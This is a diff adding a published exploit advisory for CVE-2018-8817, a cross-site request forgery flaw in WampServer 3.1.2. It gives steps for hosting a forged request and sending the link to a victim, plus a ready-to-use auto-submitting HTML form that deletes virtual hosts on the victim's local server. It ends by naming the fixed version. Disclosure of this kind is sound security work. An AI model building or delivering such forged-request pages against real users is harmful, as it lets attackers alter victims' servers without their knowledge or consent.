@@ -1,0 +1,47 @@
+# Exploit Title: WampServer 3.1.2 CSRF to add or delete any virtual hostsremotely
+# Date: 31-03-2018
+# Software Link: http://www.wampserver.com/en/
+# Version: 3.1.2
+# Tested On: Windows 10
+# Exploit Author: Vipin Chaudhary
+# Contact: http://twitter.com/vipinxsec
+# Website: http://medium.com/@vipinxsec
+# CVE: CVE-2018-8817
+
+
+1. Description
+
+CSRF (Cross site request forgery) in WampServer 3.1.2 which allows a remote
+attacker to force any victim to add or delete virtual hosts.
+
+http://forum.wampserver.com/read.php?2,138295,150722,page=6#msg-150722
+
+2. Proof of Concept
+
+How to exploit this CSRF vulnerability:
+1. Go to Add a Virtual host and add one to wampserver.
+2. Now intercept the request with proxy tool like burp suite.
+3. Now make a CSRF PoC of the request and to exploit you can host it on
+internet and send the link to the victim.
+
+*Exploit Code for deleting any host remotely:*
+
+1. Copy and paste this CSRF request in notepad and save it as anything.html
+<html>
+  <body onload="wamp_csrf.submit();">
+    <form action="http://localhost/add_vhost.php?lang=english"
+name="wamp_csrf" method="POST">
+      <input type="hidden" name="virtual&#95;del&#91;&#93;"
+value="localhost" />
+      <input type="hidden" name="vhostdelete" value="Suppress&#32;VirtualHost"
+/>
+    </form>
+  </body>
+</html>
+
+2. Then run it on your installed vulnerable wampserver.
+
+3. Solution:
+
+Update to version 3.1.3
+http://www.wampserver.com/en/#download-wrapper
